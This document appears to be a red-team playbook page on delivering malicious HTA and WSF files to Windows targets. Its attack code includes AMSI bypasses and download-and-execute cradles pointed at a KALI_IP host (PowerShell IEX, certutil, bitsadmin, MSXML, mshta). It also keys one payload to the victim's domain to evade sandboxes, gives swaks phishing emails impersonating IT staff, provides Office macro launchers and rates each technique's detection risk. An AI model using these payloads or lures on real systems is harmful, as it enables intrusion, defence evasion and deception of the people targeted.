# HTA & WSF Payload Delivery

HTA (HTML Application) and WSF (Windows Script File) let you execute VBScript/JScript with elevated trust — they run outside the browser sandbox and have access to COM objects, WScript.Shell, and the full Windows API via ActiveX.

**Key advantage:** Both formats often bypass Script Block Logging that catches plain PowerShell. WSF additionally lets you mix JScript and VBScript in one file.

---

## HTA — HTML Application

An `.hta` file is treated as a trusted application by Windows, not a browser page. It runs with the same privileges as the current user.

### Basic HTA (PowerShell Cradle)

Save as `delivery.hta`, host on Kali, send URL to target:

```html
<html>
<head>
<script language="VBScript">
    Sub AutoRun()
        Dim oShell
        Set oShell = CreateObject("WScript.Shell")
        ' AMSI bypass + download + execute in PowerShell:
        Dim cmd
        cmd = "powershell.exe -ep bypass -w hidden -c """ & _
              "$a=[Ref].Assembly.GetTypes();" & _
              "foreach($t in $a){if($t.Name -like '*iUtils'){" & _
              "$f=$t.GetField('amsiInitFailed','NonPublic,Static');" & _
              "$f.SetValue($null,$true)}};" & _
              "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/payload.ps1')"""
        oShell.Run cmd, 0, False
    End Sub

    Sub Window_onLoad()
        AutoRun()
        ' Optional: close the HTA window after launching
        Self.Close()
    End Sub
</script>
</head>
<body>
<!-- Visible content to make it look legitimate -->
<h1>Loading document...</h1>
</body>
</html>
```

**Deliver via:**
```
# URL in email/Teams/Slack message:
http://KALI_IP/delivery.hta

# Or via mshta.exe directly:
mshta.exe http://KALI_IP/delivery.hta
mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a.Run('powershell -enc BASE64',0);close()"
```

### HTA Inline Execution (No PS — JScript)

No PowerShell involved — pure JScript inside HTA:

```html
<html>
<head>
<script language="JScript">
    var shell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");

    // Download and run payload via certutil (no PowerShell):
    shell.Run("cmd.exe /c certutil -urlcache -split -f http://KALI_IP/payload.exe %TEMP%\\update.exe && %TEMP%\\update.exe", 0, false);

    // Or use bitsadmin:
    // shell.Run("bitsadmin /transfer job /download /priority high http://KALI_IP/p.exe %TEMP%\\p.exe && %TEMP%\\p.exe", 0, false);

    window.close();
</script>
</head>
<body><p>Loading...</p></body>
</html>
```

### HTA with Shellcode (DotNetToJScript Style)

For environments where PowerShell is logged/blocked — runs .NET code from JScript:

```html
<html>
<head>
<script language="JScript">
// DotNetToJScript technique: create .NET object from JScript
var o = new ActiveXObject("ScriptControl");
o.Language = "VBScript";
// Note: ScriptControl is not available on 64-bit; use 32-bit mshta.exe or CSC approach
// For modern approach, use the PowerShell AMSI bypass + Invoke-SharpLoader instead
</script>
</head>
</html>
```

---

## WSF — Windows Script File

WSF lets you mix JScript and VBScript in the same file. Can call out to any registered COM object, download files, execute code.

**Why WSF over plain .js or .vbs?**
- More flexible — can combine languages
- Slightly less known/monitored than pure PS
- Can be delivered as email attachment or via macro

### Template 1: WSF Downloader + Executor

Save as `update.wsf`:

```xml
<?xml version="1.0"?>
<job id="Main">
  <script language="JScript">
  <![CDATA[
    // --- Stage 1: AMSI bypass (via registry, no PS needed) ---
    // Disable script scanning via HKCU (doesn't need admin):
    var sh = new ActiveXObject("WScript.Shell");
    try {
      sh.RegWrite("HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable", 0, "REG_DWORD");
    } catch(e) {}

    // --- Stage 2: Download payload ---
    var url = "http://KALI_IP/payload.ps1";
    var xmlhttp = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
    xmlhttp.Open("GET", url, false);
    xmlhttp.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
    xmlhttp.Send();
    var content = xmlhttp.responseText;

    // --- Stage 3: Execute via PowerShell hidden ---
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var tmpPath = sh.ExpandEnvironmentStrings("%TEMP%") + "\\update.ps1";
    var f = fso.CreateTextFile(tmpPath, true);
    f.WriteLine(content);
    f.Close();

    sh.Run("powershell.exe -ep bypass -w hidden -f " + tmpPath, 0, false);

    // Cleanup after brief delay:
    WScript.Sleep(3000);
    fso.DeleteFile(tmpPath);
  ]]>
  </script>
</job>
```

**Execute:**
```cmd
wscript.exe update.wsf
cscript.exe update.wsf
```

### Template 2: WSF Multi-Stage (JScript + VBScript Mixed)

```xml
<?xml version="1.0"?>
<job id="MultiStage">
  <script language="VBScript">
  <![CDATA[
    ' VBScript: Environment keying — only run on target domain
    Dim oNet
    Set oNet = CreateObject("WScript.Network")
    Dim domain
    domain = oNet.UserDomain
    If LCase(domain) <> "corp" Then
      WScript.Quit
    End If
  ]]>
  </script>

  <script language="JScript">
  <![CDATA[
    // JScript: Download and execute payload
    var sh = new ActiveXObject("WScript.Shell");

    // Inline PowerShell with AMSI bypass + download:
    var psCmd = "powershell -ep bypass -w hidden -c \"" +
      "$a=[Ref].Assembly.GetTypes();" +
      "foreach($t in $a){if($t.Name -like '*iUtils')" +
      "{$f=$t.GetField('amsiInitFailed','NonPublic,Static');" +
      "$f.SetValue($null,$true)}};" +
      "IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-SharpLoader.ps1');" +
      "Invoke-SharpLoader -location 'http://KALI_IP/payload.enc' -password 'MYKEY'\"";

    sh.Run(psCmd, 0, false);
  ]]>
  </script>
</job>
```

### Template 3: WSF Fully In-Memory (No PS — Pure COM)

When PowerShell is completely blocked:

```xml
<?xml version="1.0"?>
<job id="InMemory">
  <script language="JScript">
  <![CDATA[
    var sh = new ActiveXObject("WScript.Shell");

    // Method 1: mshta to run another HTA in-memory:
    sh.Run("mshta.exe http://KALI_IP/delivery.hta", 0, false);

    // Method 2: certutil decode + execute
    // (base64 encode your payload first: certutil -encode payload.exe payload.b64)
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var xmlhttp = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
    xmlhttp.Open("GET", "http://KALI_IP/payload.b64", false);
    xmlhttp.Send();
    var tmp = sh.ExpandEnvironmentStrings("%TEMP%") + "\\update.b64";
    var out = sh.ExpandEnvironmentStrings("%TEMP%") + "\\update.exe";
    var f = fso.CreateTextFile(tmp, true);
    f.WriteLine(xmlhttp.responseText);
    f.Close();
    sh.Run("certutil -decode " + tmp + " " + out, 0, true);
    sh.Run(out, 0, false);
    WScript.Sleep(2000);
    fso.DeleteFile(tmp);
  ]]>
  </script>
</job>
```

---

## Delivery Methods

### Via Email (swaks)
```bash
# Send WSF as attachment:
swaks --to victim@corp.com \
      --from "helpdesk@corp.com" \
      --server SMTP_SERVER \
      --header "Subject: Action Required - System Update" \
      --body "Please run the attached maintenance script." \
      --attach update.wsf

# Send HTA link in body:
swaks --to victim@corp.com \
      --from "it@corp.com" \
      --server SMTP_SERVER \
      --header "Subject: Urgent - VPN Update Required" \
      --body "Click here to update VPN: http://KALI_IP/vpn-update.hta"
```

### Via Web / Phishing Page
```html
<!-- Force download via HTTP redirect: -->
<meta http-equiv="refresh" content="0;url=http://KALI_IP/update.wsf">
```

### Via Macro (Office)
```vba
' Launch WSF from a macro:
Shell "wscript.exe \\\\KALI_IP\\share\\update.wsf"

' Launch HTA from a macro:
Shell "mshta.exe http://KALI_IP/delivery.hta"
```

---

## OPSEC Notes

| Technique | Detection Risk | Notes |
|-----------|---------------|-------|
| `.hta` via URL | Medium | Defender flags mshta.exe spawning cmd/PS |
| `.wsf` via wscript | Low-Medium | Less monitored than PS, still flagged if PS spawned |
| Inline JScript execution | Low | No PS process at all if pure COM |
| Mixed JScript+VBScript | Low | Env keying reduces sandbox analysis effectiveness |
| DOM download (MSXML) | Low | Legitimate COM object, less suspicious than WebClient |

---

## See Also

- HTA delivery in phishing: `02-phishing/calendar/README.md`
- AMSI bypass: `01-evasion/amsi-bypass/`
- SharpLoader for .NET tools: `03-loaders/reflective/`
- SMTP delivery: `02-phishing/swaks-delivery.md`
